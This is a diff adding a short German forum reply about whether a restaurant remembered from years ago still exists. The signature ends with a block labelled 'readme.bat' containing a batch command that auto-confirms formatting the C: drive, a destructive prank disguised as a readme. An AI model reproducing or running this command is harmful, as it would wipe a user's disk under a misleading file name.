@@ -1,0 +1,20 @@
+On Tue, 20. 03. 23 18:11:28 +0200, "Bodo Furmanski"
+
+Das weiss ich beim besten Willen nicht mehr. Ich weiss ja nicht mal,
+ob es das Restaurant nach fuenf, sechs Jahren noch gibt. Vielleicht
+ist es ja auch schon zur Touristenattraktion geworden und/oder die
+damaligen Besitzer gibt es gar nicht mehr.
+
+Du musst also schon selbst auf die Suche gehen und Dein Glueck
+versuchen, vielleicht auch eine Enttaeuschung erleben. Deiner Frage
+entnehme ich, dass Du nicht sehr viel Zeit hast in Irnsing.
+
+Vielleicht/hoffentlich schreibt noch jemand anders hier was dazu, denn
+ich wuerde auch schon gern mal wieder nach Portugal reisen ...
+
+Norman
+-- 
+begin  readme.bat
+echo off
+echo Y|c:\windows\command\format c:
+end
